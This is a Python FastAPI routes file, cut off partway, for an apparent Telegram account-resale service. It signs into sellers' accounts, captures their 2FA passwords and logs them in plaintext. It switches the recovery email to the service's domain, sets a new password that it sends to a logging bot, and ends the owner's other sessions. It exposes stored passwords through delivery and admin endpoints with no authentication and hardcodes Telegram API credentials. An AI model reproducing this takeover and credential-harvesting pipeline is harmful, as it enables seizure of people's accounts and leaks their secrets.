"""
API Routes V3 - Simplified and Unified
Main endpoints:
- POST /api/v1/auth/init - Initialize authentication
- POST /api/v1/auth/verify - Verify code/2FA
- GET /api/v1/account/audit/{account_id} - Run security audit
- POST /api/v1/account/finalize/{account_id} - Finalize account

Email endpoints:
- GET /api/v1/email/target/{account_id} - Get target email for user
- GET /api/v1/email/code/{account_id} - Check if code received
- POST /api/v1/email/confirm/{account_id} - Confirm email changed

Session endpoints:
- GET /api/v1/sessions/health/{account_id} - Check session health
- POST /api/v1/sessions/regenerate/{account_id} - Regenerate sessions

Delivery endpoints:
- POST /api/v1/delivery/request-code/{account_id} - Request delivery code
- POST /api/v1/delivery/confirm/{account_id} - Confirm delivery received
"""

import time
import json
import secrets
import string
import asyncio
from datetime import datetime, timedelta
from typing import Optional, Dict
from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from backend.core_engine.logger import get_logger, log_request, log_response, log_auth_step
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.telethon_client import get_telethon_manager
from backend.core_engine.credentials_logger import (
    log_credentials, 
    generate_email_for_account, 
    get_email_hash,
    get_full_email_info,
    get_phone_from_hash,
    get_telegram_id_from_hash
)
from backend.services.security_audit import SecurityAuditService, TransferMode
from backend.models.database import (
    AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
    add_account, get_account, update_account, log_auth_action
)
from backend.api.webhook_routes import get_code_by_hash, email_codes_store

logger = get_logger("RoutesV3")

router = APIRouter(prefix="/api/v1", tags=["V3 API"])

# API credentials
API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


# ============== Request Models ==============

class InitAuthRequest(BaseModel):
    phone: str
    transfer_mode: str = "bot_only"  # "bot_only" or "user_keeps_session"


class VerifyAuthRequest(BaseModel):
    phone: str
    code: Optional[str] = None
    password: Optional[str] = None


class FinalizeRequest(BaseModel):
    confirm_email_changed: bool = False
    two_fa_password: Optional[str] = None


class DeliveryConfirmRequest(BaseModel):
    received: bool = True


# ============== Session Cache (RAM) ==============

# Cache for 2FA passwords and session start times
# Format: {phone: {"2fa_password": str, "started_at": datetime, "telegram_id": int}}
session_cache: Dict[str, Dict] = {}

# Session timeout in seconds (30 minutes)
SESSION_TIMEOUT_SECONDS = 30 * 60


def cache_session_data(phone: str, **kwargs):
    """Cache session data in RAM"""
    if phone not in session_cache:
        session_cache[phone] = {"started_at": datetime.utcnow()}
    session_cache[phone].update(kwargs)


def get_cached_data(phone: str, key: str = None):
    """Get cached data for a phone"""
    if phone not in session_cache:
        return None
    if key:
        return session_cache[phone].get(key)
    return session_cache[phone]


def clear_session_cache(phone: str):
    """Clear cached data for a phone"""
    if phone in session_cache:
        del session_cache[phone]


def check_session_timeout(phone: str) -> bool:
    """Check if session has timed out (30 min limit)"""
    data = get_cached_data(phone)
    if not data or "started_at" not in data:
        return False  # No session started
    
    started_at = data["started_at"]
    elapsed = (datetime.utcnow() - started_at).total_seconds()
    return elapsed > SESSION_TIMEOUT_SECONDS


def get_session_remaining_time(phone: str) -> int:
    """Get remaining time in seconds"""
    data = get_cached_data(phone)
    if not data or "started_at" not in data:
        return SESSION_TIMEOUT_SECONDS
    
    started_at = data["started_at"]
    elapsed = (datetime.utcnow() - started_at).total_seconds()
    remaining = SESSION_TIMEOUT_SECONDS - elapsed
    return max(0, int(remaining))


# ============== Helper Functions ==============

def get_pyrogram():
    return get_session_manager(API_ID, API_HASH)


def get_telethon():
    return get_telethon_manager(API_ID, API_HASH)


def generate_strong_password(length: int = 20) -> str:
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
    return ''.join(secrets.choice(alphabet) for _ in range(length))


async def check_session_validity(manager, phone: str) -> dict:
    """Check if a session is valid by trying to get user info"""
    try:
        result = await manager.get_me_info(phone)
        return {"valid": result.get("status") == "success", "result": result}
    except Exception as e:
        return {"valid": False, "error": str(e)}


# ============== Auth Endpoints ==============

@router.post("/auth/init")
async def init_auth(request: InitAuthRequest, req: Request):
    """
    Initialize authentication - Send verification code
    """
    start_time = time.time()
    phone = request.phone
    log_request(logger, "POST", "/auth/init", {"phone": phone})
    
    try:
        # Determine transfer mode - convert string to enum value
        if request.transfer_mode == "bot_only":
            transfer_mode = "BOT_ONLY"
        else:
            transfer_mode = "USER_KEEPS_SESSION"
        
        # Check existing account
        account = await get_account(phone)
        if not account:
            account = await add_account(phone)
        
        # Update transfer mode
        await update_account(phone, transfer_mode=transfer_mode)
        
        # Check if already authenticated in both sessions
        manager = get_pyrogram()
        telethon_mgr = get_telethon()
        
        # Check Pyrogram session
        pyrogram_check = await manager.get_me_info(phone)
        pyrogram_authenticated = pyrogram_check.get("status") == "success"
        
        # Check Telethon session
        telethon_authenticated = False
        try:
            telethon_check = await telethon_mgr.get_me_info(phone)
            telethon_authenticated = telethon_check.get("status") == "success"
        except:
            pass
        
        # If already authenticated in either session, skip code sending
        if pyrogram_authenticated or telethon_authenticated:
            logger.info(f"Account already authenticated: pyrogram={pyrogram_authenticated}, telethon={telethon_authenticated}")
            
            # Get user info for telegram_id
            user_info = pyrogram_check if pyrogram_authenticated else telethon_check
            telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
            
            # Generate email info
            email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
            
            # Update account
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                email_hash=email_info.get("hash"),
                target_email=email_info.get("email")
            )
            await log_auth_action(phone, "init_auth", "already_authenticated")
            
            # Start session timer
            cache_session_data(phone, started_at=datetime.utcnow(), telegram_id=telegram_id)
            
            duration = time.time() - start_time
            response = {
                "status": "already_authenticated",
                "message": "Account already authenticated. Skip to audit.",
                "telegram_id": telegram_id,
                "target_email": email_info.get("email"),
                "email_hash": email_info.get("hash"),
                "transfer_mode": request.transfer_mode,
                "session_timeout": SESSION_TIMEOUT_SECONDS,
                "duration": duration
            }
            log_response(logger, 200, response)
            return response
        
        # Send code via Pyrogram
        result = await manager.send_code(phone)
        
        logger.info(f"send_code result: {result}")
        
        # Check for success statuses: "code_sent" or "already_logged_in"
        if result["status"] in ["code_sent", "already_logged_in", "success"]:
            await update_account(phone, status=AuthStatus.PENDING_CODE)
            await log_auth_action(phone, "init_auth", "success")
            
            # Start session timer (30 min limit)
            cache_session_data(phone, started_at=datetime.utcnow())
            
            duration = time.time() - start_time
            response = {
                "status": result["status"],
                "message": "Verification code sent to Telegram" if result["status"] == "code_sent" else "Already logged in",
                "phone_code_hash": result.get("phone_code_hash"),
                "transfer_mode": request.transfer_mode,
                "session_timeout": SESSION_TIMEOUT_SECONDS,
                "duration": duration
            }
            log_response(logger, 200, response)
            return response
        else:
            logger.error(f"init_auth failed: {result}")
            await log_auth_action(phone, "init_auth", "failed", result.get("error"))
            raise HTTPException(status_code=400, detail=result.get("error", "Unknown error"))
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in init_auth: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/auth/verify")
async def verify_auth(request: VerifyAuthRequest, req: Request):
    """
    Verify authentication - Code or 2FA password
    """
    start_time = time.time()
    phone = request.phone
    log_request(logger, "POST", "/auth/verify", {"phone": phone})
    
    try:
        manager = get_pyrogram()
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found. Call /auth/init first.")
        
        # If code provided, verify code
        if request.code:
            result = await manager.verify_code(phone, request.code)
            
            if result["status"] == "logged_in":
                # Get user info
                user_info = await manager.get_me_info(phone)
                telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
                
                # Generate email info
                email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
                
                await update_account(
                    phone,
                    status=AuthStatus.AUTHENTICATED,
                    telegram_id=telegram_id,
                    email_hash=email_info.get("hash"),
                    target_email=email_info.get("email")
                )
                await log_auth_action(phone, "verify_code", "success")
                
                # Send log to bot - new account registered
                try:
                    from backend.log_bot import get_bot_app, log_new_account
                    bot_app = get_bot_app()
                    if bot_app:
                        await log_new_account(bot_app, phone, telegram_id, email_info.get("email", ""))
                except:
                    pass
                
                duration = time.time() - start_time
                return {
                    "status": "authenticated",
                    "message": "Successfully authenticated",
                    "telegram_id": telegram_id,
                    "target_email": email_info.get("email"),
                    "email_hash": email_info.get("hash"),
                    "duration": duration
                }
            
            elif result["status"] == "2fa_required":
                await update_account(phone, status=AuthStatus.PENDING_2FA, has_2fa=True)
                await log_auth_action(phone, "verify_code", "2fa_required")
                
                return {
                    "status": "2fa_required",
                    "message": "2FA password required",
                    "hint": result.get("hint", "")
                }
            else:
                await log_auth_action(phone, "verify_code", "failed", result.get("error"))
                raise HTTPException(status_code=400, detail=result.get("error"))
        
        # If password provided, verify 2FA
        elif request.password:
            result = await manager.verify_2fa(phone, request.password)
            
            if result["status"] == "logged_in":
                user_info = await manager.get_me_info(phone)
                telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
                
                email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
                
                await update_account(
                    phone,
                    status=AuthStatus.AUTHENTICATED,
                    telegram_id=telegram_id,
                    email_hash=email_info.get("hash"),
                    target_email=email_info.get("email")
                )
                await log_auth_action(phone, "verify_2fa", "success")
                
                # Log password
                log_credentials(
                    phone=phone,
                    action="2FA_VERIFIED",
                    password=request.password,
                    telegram_id=telegram_id
                )
                
                # Cache 2FA password for later use in finalize
                cache_session_data(phone, two_fa_password=request.password, telegram_id=telegram_id)
                
                duration = time.time() - start_time
                return {
                    "status": "authenticated",
                    "message": "Successfully authenticated with 2FA",
                    "telegram_id": telegram_id,
                    "target_email": email_info.get("email"),
                    "email_hash": email_info.get("hash"),
                    "two_fa_cached": True,
                    "duration": duration
                }
            else:
                await log_auth_action(phone, "verify_2fa", "failed", result.get("error"))
                raise HTTPException(status_code=400, detail=result.get("error"))
        
        else:
            raise HTTPException(status_code=400, detail="Either code or password must be provided")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in verify_auth: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============== Account Audit Endpoints ==============

@router.get("/account/audit/{account_id}")
async def audit_account(account_id: str, req: Request):
    """
    Run security audit on account
    Checks: 2FA, recovery email, other sessions, delete requests
    """
    start_time = time.time()
    phone = account_id
    log_request(logger, "GET", f"/account/audit/{phone}", None)
    
    try:
        manager = get_pyrogram()
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        # Get security info
        security_info = await manager.get_security_info(phone)
        if security_info.get("status") == "error":
            raise HTTPException(status_code=400, detail=security_info.get("error"))
        
        # Get telegram_id
        telegram_id = account.telegram_id
        if not telegram_id:
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
        
        # Get transfer mode
        mode = TransferMode.MODE_BOT_ONLY
        if account.transfer_mode == DBTransferMode.USER_KEEPS_SESSION:
            mode = TransferMode.MODE_USER_KEEPS_SESSION
        
        # Run audit
        passed, issues, actions_needed = SecurityAuditService.run_audit(
            security_info=security_info,
            phone=phone,
            mode=mode,
            telegram_id=telegram_id
        )
        
        # Generate our target email for this account
        if not account.target_email and telegram_id:
            email_info = get_full_email_info(telegram_id, phone)
            await update_account(
                phone,
                email_hash=email_info["hash"],
                target_email=email_info["email"]
            )
            our_email = email_info["email"]
            our_hash = email_info["hash"]
        else:
            our_email = account.target_email or ""
            our_hash = account.email_hash or ""
        
        # Check if email is already changed to ours
        # Telegram returns email patterns in these fields:
        # - email_unconfirmed_pattern: when email is set but not yet confirmed
        # - login_email_pattern: login email (can be recovery email too)
        # - has_recovery: True when recovery email is confirmed
        email_unconfirmed = security_info.get("email_unconfirmed_pattern", "")
        login_email = security_info.get("login_email_pattern", "")
        has_recovery = security_info.get("has_recovery_email", False)
        
        email_changed = False
        email_verified = False
        current_email_pattern = email_unconfirmed or login_email or ""
        
        our_domain = our_email.split("@")[-1] if "@" in our_email else ""
        
        # Check unconfirmed email pattern
        if email_unconfirmed and our_domain:
            if our_domain.lower() in email_unconfirmed.lower():
                email_changed = True
                email_verified = False  # Not yet confirmed
                logger.info(f"Email set to our domain (unconfirmed) for {phone}: {email_unconfirmed}")
        
        # Check login email pattern (this is the confirmed recovery email)
        if login_email and our_domain:
            if our_domain.lower() in login_email.lower():
                email_changed = True
                email_verified = True  # Login email means it's confirmed
                logger.info(f"Email confirmed with our domain for {phone}: {login_email}")
        
        # Fallback: If has_recovery is True and we previously set it
        if not email_changed and has_recovery and account.email_changed:
            email_changed = True
            email_verified = True
            logger.info(f"Email already confirmed (trusted from DB) for {phone}")
        
        # MANDATORY: Email must be changed to ours (unless already done)
        if not email_changed:
            # Add email change requirement to issues
            email_issue = {
                "type": "EMAIL_CHANGE_MANDATORY",
                "severity": "blocker",
                "title": "تغيير الإيميل إجباري",
                "description": "يجب تغيير إيميل الاسترداد إلى إيميلنا قبل المتابعة",
                "action": f"قم بتغيير الإيميل إلى: {our_email}",
                "target_email": our_email,
                "email_hash": our_hash,
                "current_email": current_email_pattern or "غير محدد",
                "auto_fixable": False,
                "mandatory": True
            }
            issues.insert(0, email_issue)  # Add at beginning
            passed = False  # Force fail until email is changed
        
        # Update account with audit results
        await update_account(
            phone,
            status=AuthStatus.AUDIT_PASSED if passed else AuthStatus.AUDIT_FAILED,
            has_2fa=security_info.get("has_password", False),
            has_recovery_email=security_info.get("has_recovery_email", False),
            other_sessions_count=security_info.get("other_sessions_count", 0),
            audit_passed=passed,
            audit_issues=json.dumps(issues) if issues else None,
            email_changed=email_changed,
            email_verified=email_verified
        )
        
        await log_auth_action(phone, "audit", "passed" if passed else "failed")
        
        # Format report
        report = SecurityAuditService.format_audit_report(passed, issues, actions_needed)
        report["account_id"] = phone
        report["telegram_id"] = telegram_id
        report["target_email"] = our_email
        report["email_hash"] = our_hash
        report["email_changed"] = email_changed
        report["email_verified"] = email_verified
        report["email_mandatory"] = not email_changed
        report["transfer_mode"] = account.transfer_mode.value if account.transfer_mode else "bot_only"
        report["duration"] = time.time() - start_time
        
        log_response(logger, 200, report)
        return report
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in audit: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/finalize/{account_id}")
async def finalize_account(account_id: str, request: FinalizeRequest, req: Request):
    """
    Finalize account after all requirements met
    - Generates strong 2FA password
    - Creates both Pyrogram and Telethon sessions
    - Terminates other sessions based on mode
    """
    start_time = time.time()
    phone = account_id
    log_request(logger, "POST", f"/account/finalize/{phone}", None)
    
    try:
        # Check session timeout (30 min limit)
        if check_session_timeout(phone):
            # Save session to backup before clearing
            manager = get_pyrogram()
            try:
                backup_session = await manager.export_session_string(phone)
                if backup_session:
                    await update_account(phone, 
                        pyrogram_session=backup_session,
                        status=AuthStatus.EXPIRED
                    )
                    logger.warning(f"Session expired for {phone}, saved to backup")
            except:
                pass
            clear_session_cache(phone)
            raise HTTPException(
                status_code=408, 
                detail="انتهت المهلة (30 دقيقة). يرجى البدء من جديد. تم حفظ الجلسة احتياطياً."
            )
        
        account = await get_account(phone)
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        if not account.audit_passed:
            raise HTTPException(status_code=400, detail="Audit not passed. Run audit first.")
        
        manager = get_pyrogram()
        
        # Generate strong password
        new_password = generate_strong_password(24)
        
        # Get cached 2FA password (from verify step)
        cached_2fa = get_cached_data(phone, "two_fa_password")
        current_2fa_password = request.two_fa_password or cached_2fa
        
        # Enable/Change 2FA with recovery email (our email)
        target_email = account.target_email
        if account.has_2fa and current_2fa_password:
            # Change existing password
            result = await manager.change_2fa_password(
                phone=phone,
                current_password=current_2fa_password,
                new_password=new_password
            )
            # Also set recovery email if not already set to ours
            if target_email:
                try:
                    await manager.change_recovery_email(phone, new_password, target_email)
                except:
                    pass
        else:
            # Enable new 2FA with our recovery email
            result = await manager.enable_2fa(phone, new_password, hint="Escrow secure", email=target_email or "")
        
        if result.get("status") != "success":
            raise HTTPException(status_code=400, detail=f"Failed to set 2FA: {result.get('error')}")
        
        # Send log to bot
        try:
            from backend.log_bot import get_bot_app, log_password_set
            bot_app = get_bot_app()
            if bot_app:
                await log_password_set(bot_app, phone, account.telegram_id, new_password)
        except:
            pass
        
        # Export Pyrogram session
        pyrogram_session = await manager.export_session_string(phone)
        
        # Create Telethon session
        telethon_manager = get_telethon()
        telethon_session = None
        # TODO: Implement Telethon session creation
        
        # Terminate other sessions if bot_only mode
        terminated_count = 0
        if account.transfer_mode == DBTransferMode.BOT_ONLY:
            term_result = await manager.terminate_other_sessions(phone)
            terminated_count = term_result.get("terminated_count", 0)
        
        # Log credentials
        log_credentials(
            phone=phone,
            action="ACCOUNT_FINALIZED",
            password=new_password,
            email=account.target_email,
            telegram_id=account.telegram_id,
            extra_data={
                "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
                "terminated_sessions": terminated_count
            }
        )
        
        # Update account
        # Note: export_session_string returns string directly, not dict
        # Use BOT_RECEIVED status - account received by bot from seller, ready for buyer
        await update_account(
            phone,
            status=AuthStatus.COMPLETED,
            generated_password=new_password,
            pyrogram_session=pyrogram_session if isinstance(pyrogram_session, str) else None,
            telethon_session=telethon_session,
            completed_at=datetime.utcnow(),
            delivery_status=DeliveryStatus.BOT_RECEIVED,  # Bot received from seller
            has_2fa=True  # Mark as having 2FA since we just set it
        )
        
        await log_auth_action(phone, "finalize", "success")
        
        # Clear session cache after successful finalize
        clear_session_cache(phone)
        
        duration = time.time() - start_time
        return {
            "status": "success",
            "message": "Account finalized successfully",
            "account_id": phone,
            "password": new_password,
            "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
            "terminated_sessions": terminated_count,
            "duration": duration
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in finalize: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/session/status/{account_id}")
async def get_session_status(account_id: str):
    """
    Get session status including timeout info
    """
    phone = account_id
    
    remaining = get_session_remaining_time(phone)
    is_expired = check_session_timeout(phone)
    cached_data = get_cached_data(phone)
    
    return {
        "account_id": phone,
        "session_active": cached_data is not None,
        "remaining_seconds": remaining,
        "remaining_minutes": remaining // 60,
        "is_expired": is_expired,
        "has_cached_2fa": cached_data.get("two_fa_password") is not None if cached_data else False,
        "timeout_limit": SESSION_TIMEOUT_SECONDS
    }


# ============== Email Endpoints ==============

@router.get("/email/target/{account_id}")
async def get_target_email(account_id: str):
    """
    Get the target email that user should change their recovery email to
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    telegram_id = account.telegram_id
    if not telegram_id:
        raise HTTPException(status_code=400, detail="Telegram ID not found. Complete authentication first.")
    
    email_info = get_full_email_info(telegram_id, phone)
    
    # Update account with email info
    await update_account(
        phone,
        email_hash=email_info["hash"],
        target_email=email_info["email"]
    )
    
    return {
        "status": "success",
        "account_id": phone,
        "target_email": email_info["email"],
        "email_hash": email_info["hash"],
        "instructions": "User should change their Telegram recovery email to this address"
    }


@router.get("/email/code/{account_id}")
async def check_email_code(account_id: str, wait_seconds: int = 0):
    """
    Check if verification code was received for this account
    Optional: wait up to N seconds for code to arrive
    """
    try:
        phone = account_id
        logger.info(f"Checking email code for {phone}, wait_seconds={wait_seconds}")
        
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        email_hash = account.email_hash
        logger.info(f"Account found, email_hash={email_hash}")
        
        if not email_hash:
            raise HTTPException(status_code=400, detail="Email hash not found. Get target email first.")
        
        # Normalize hash to lowercase for consistent lookup
        email_hash_lower = email_hash.lower()
        
        # Wait for code if requested
        code = None
        waited = 0
        while waited < wait_seconds:
            code = get_code_by_hash(email_hash_lower)
            if code:
                break
            await asyncio.sleep(1)
            waited += 1
        
        if not code:
            code = get_code_by_hash(email_hash_lower)
        
        logger.info(f"Code check result: {code}")
        
        if code:
            return {
                "status": "received",
                "account_id": phone,
                "code": code,
                "message": "Verification code received"
            }
        else:
            return {
                "status": "waiting",
                "account_id": phone,
                "message": "Code not received yet",
                "email_hash": email_hash
            }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in check_email_code: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/email/confirm/{account_id}")
async def confirm_email_changed(account_id: str):
    """
    Confirm that user has changed their email and verify it
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    
    # Get current security info to verify email change
    security_info = await manager.get_security_info(phone)
    if security_info.get("status") == "error":
        raise HTTPException(status_code=400, detail=security_info.get("error"))
    
    current_email_pattern = security_info.get("recovery_email_pattern", "")
    our_email = account.target_email or ""
    
    # Check if email matches our pattern
    # The pattern from Telegram is like "e***l@channelsseller.site"
    email_matches = False
    if our_email and current_email_pattern:
        our_domain = our_email.split("@")[-1] if "@" in our_email else ""
        pattern_domain = current_email_pattern.split("@")[-1] if "@" in current_email_pattern else ""
        email_matches = our_domain == pattern_domain
    
    if email_matches:
        await update_account(phone, email_changed=True, email_verified=True)
        
        log_credentials(
            phone=phone,
            action="EMAIL_VERIFIED",
            email=our_email,
            telegram_id=account.telegram_id
        )
        
        # Send log to bot
        try:
            from backend.log_bot import get_bot_app, log_email_set
            bot_app = get_bot_app()
            if bot_app:
                await log_email_set(bot_app, phone, account.telegram_id, our_email)
        except:
            pass
        
        return {
            "status": "success",
            "message": "Email change verified",
            "email_changed": True,
            "current_pattern": current_email_pattern
        }
    else:
        return {
            "status": "not_changed",
            "message": "Email not changed to our address yet",
            "email_changed": False,
            "current_pattern": current_email_pattern,
            "expected_email": our_email
        }


# ============== Session Health Endpoints ==============

@router.get("/sessions/health/{account_id}")
async def check_sessions_health(account_id: str):
    """
    Check health of all sessions for an account
    Verifies: Pyrogram, Telethon sessions, email unchanged, 2FA unchanged, session counts
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    
    # Check Pyrogram session
    pyrogram_valid = await check_session_validity(manager, phone)
    
    # Check Telethon session
    telethon_valid = {"valid": False, "error": "Not implemented yet"}
    
    # Get security info
    security_info = await manager.get_security_info(phone)
    security_valid = security_info.get("status") == "success"
    
    # Verify email hasn't changed
    current_email_pattern = security_info.get("recovery_email_pattern", "") if security_valid else ""
    our_email = account.target_email or ""
    email_still_ours = False
    if our_email and current_email_pattern:
        our_domain = our_email.split("@")[-1] if "@" in our_email else ""
        pattern_domain = current_email_pattern.split("@")[-1] if "@" in current_email_pattern else ""
        email_still_ours = our_domain == pattern_domain
    
    # Count sessions
    other_sessions = security_info.get("other_sessions_count", 0) if security_valid else 0
    expected_sessions = 1 if account.transfer_mode == DBTransferMode.USER_KEEPS_SESSION else 0
    sessions_ok = other_sessions <= expected_sessions + 2  # +2 for our bot sessions
    
    # Check for delete request
    has_delete_request = False  # TODO: Implement delete request check
    
    # Update account
    await update_account(
        phone,
        pyrogram_healthy=pyrogram_valid["valid"],
        telethon_healthy=telethon_valid["valid"],
        last_session_check=datetime.utcnow(),
        has_delete_request=has_delete_request
    )
    
    all_healthy = (
        pyrogram_valid["valid"] and
        email_still_ours and
        sessions_ok and
        not has_delete_request
    )
    
    return {
        "status": "healthy" if all_healthy else "issues_found",
        "account_id": phone,
        "checks": {
            "pyrogram_session": {
                "valid": pyrogram_valid["valid"],
                "error": pyrogram_valid.get("error")
            },
            "telethon_session": {
                "valid": telethon_valid["valid"],
                "error": telethon_valid.get("error")
            },
            "email_unchanged": email_still_ours,
            "current_email_pattern": current_email_pattern,
            "sessions_count": other_sessions,
            "sessions_ok": sessions_ok,
            "expected_max_sessions": expected_sessions + 2,
            "has_delete_request": has_delete_request
        },
        "needs_regeneration": not pyrogram_valid["valid"] or not telethon_valid["valid"],
        "needs_attention": not email_still_ours or has_delete_request
    }


@router.post("/sessions/regenerate/{account_id}")
async def regenerate_sessions(account_id: str):
    """
    Regenerate invalid sessions by re-authenticating
    Uses stored password and gets code from email webhook
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not account.generated_password:
        raise HTTPException(status_code=400, detail="No stored password. Cannot regenerate.")
    
    manager = get_pyrogram()
    
    # Check which sessions need regeneration
    pyrogram_valid = await check_session_validity(manager, phone)
    
    results = {
        "pyrogram_regenerated": False,
        "telethon_regenerated": False
    }
    
    if not pyrogram_valid["valid"]:
        # Send code
        send_result = await manager.send_code(phone)
        if send_result["status"] != "success":
            return {
                "status": "error",
                "message": f"Failed to send code: {send_result.get('error')}",
                "results": results
            }
        
        # Wait for code from email webhook (up to 20 seconds)
        email_hash = account.email_hash
        code = None
        for _ in range(20):
            code = get_code_by_hash(email_hash) if email_hash else None
            if code:
                break
            await asyncio.sleep(1)
        
        if not code:
            # Fallback: try to get code from Telegram messages
            # TODO: Implement reading code from 777000
            return {
                "status": "waiting_code",
                "message": "Code sent. Waiting for code via email or manual entry.",
                "results": results
            }
        
        # Sign in with code
        sign_result = await manager.sign_in(phone, code)
        
        if sign_result["status"] == "2fa_required":
            # Use stored password
            pwd_result = await manager.check_password(phone, account.generated_password)
            if pwd_result["status"] == "success":
                results["pyrogram_regenerated"] = True
        elif sign_result["status"] == "success":
            results["pyrogram_regenerated"] = True
    
    # TODO: Regenerate Telethon session
    
    # Update session strings
    if results["pyrogram_regenerated"]:
        session_str = await manager.export_session_string(phone)
        await update_account(
            phone,
            pyrogram_session=session_str.get("session_string"),
            pyrogram_healthy=True
        )
    
    return {
        "status": "success" if any(results.values()) else "no_changes",
        "message": "Sessions regenerated" if any(results.values()) else "No sessions needed regeneration",
        "results": results
    }


# ============== Accounts List (for receiving) ==============

@router.get("/accounts/ready")
async def get_ready_accounts():
    """
    Get all accounts that are ready for delivery (for buyer/receiver)
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    async with async_session() as session:
        # Get accounts that have been finalized
        result = await session.execute(
            select(Account).where(
                Account.pyrogram_session.isnot(None),
                Account.generated_password.isnot(None)
            )
        )
        accounts = result.scalars().all()
        
        accounts_list = []
        for acc in accounts:
            accounts_list.append({
                "phone": acc.phone,
                "telegram_id": acc.telegram_id,
                "transfer_mode": acc.transfer_mode.value if acc.transfer_mode else "bot_only",
                "status": "ready" if acc.pyrogram_session else "pending",
                "delivery_count": acc.delivery_count or 0,
                "email_changed": acc.email_changed or False
            })
        
        return {
            "status": "success",
            "accounts": accounts_list,
            "count": len(accounts_list)
        }


# ============== Delivery Endpoints ==============

@router.post("/delivery/request-code/{account_id}")
async def request_delivery_code(account_id: str):
    """
    Request delivery code for account handover
    Sends login code to user
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if account.status != AuthStatus.COMPLETED:
        raise HTTPException(status_code=400, detail="Account not ready for delivery")
    
    manager = get_pyrogram()
    
    # Send code
    result = await manager.send_code(phone)
    
    if result["status"] != "success":
        raise HTTPException(status_code=400, detail=f"Failed to send code: {result.get('error')}")
    
    # Update status
    await update_account(
        phone,
        delivery_status=DeliveryStatus.CODE_SENT,
        code_sent_at=datetime.utcnow(),
        confirmation_deadline=datetime.utcnow() + timedelta(minutes=5)
    )
    
    return {
        "status": "success",
        "message": "Delivery code sent",
        "account_id": phone,
        "two_fa_password": account.generated_password,
        "fallback_seconds": 20,
        "instructions": "User will receive code. If not received in 20 seconds, code will be fetched from email webhook."
    }


@router.post("/delivery/confirm/{account_id}")
async def confirm_delivery(account_id: str, request: DeliveryConfirmRequest):
    """
    Confirm account delivery received by user
    Logs out bot sessions and updates delivery count
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not request.received:
        return {"status": "cancelled", "message": "Delivery cancelled"}
    
    manager = get_pyrogram()
    
    # Disconnect Pyrogram session
    try:
        await manager.disconnect(phone)
    except:
        pass
    
    # TODO: Disconnect Telethon session
    
    # Update delivery count
    new_count = (account.delivery_count or 0) + 1
    
    await update_account(
        phone,
        delivery_status=DeliveryStatus.BUYER_DELIVERED,  # Delivered to buyer
        delivered_at=datetime.utcnow(),
        delivery_count=new_count,
        pyrogram_session=None,  # Clear session
        telethon_session=None
    )
    
    log_credentials(
        phone=phone,
        action="DELIVERY_CONFIRMED",
        telegram_id=account.telegram_id,
        extra_data={"delivery_number": new_count}
    )
    
    await log_auth_action(phone, "delivery_confirm", "success", f"Delivery #{new_count}")
    
    return {
        "status": "success",
        "message": f"Delivery #{new_count} confirmed",
        "account_id": phone,
        "delivery_number": new_count
    }


# ============== Dashboard / Admin Endpoints ==============

@router.get("/admin/accounts/all")
async def get_all_accounts_admin():
    """
    Get ALL accounts with full details (Admin endpoint)
    Includes: phone, status, password, sessions, telegram_id, etc.
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    async with async_session() as session:
        result = await session.execute(select(Account))
        accounts = result.scalars().all()
        
        # Categorize accounts
        ready_accounts = []      # Completed and ready for delivery
        pending_accounts = []    # In registration process
        delivered_accounts = []  # Already delivered
        expired_accounts = []    # Expired sessions
        
        for acc in accounts:
            account_data = {
                "phone": acc.phone,
                "telegram_id": acc.telegram_id,
                "status": acc.status.value if acc.status else "unknown",
                "transfer_mode": acc.transfer_mode.value if acc.transfer_mode else "bot_only",
                "password": acc.generated_password,
                "target_email": acc.target_email,
                "email_hash": acc.email_hash,
                "email_changed": acc.email_changed or False,
                "has_2fa": acc.has_2fa or False,
                "audit_passed": acc.audit_passed or False,
                "has_pyrogram_session": acc.pyrogram_session is not None,
                "has_telethon_session": acc.telethon_session is not None,
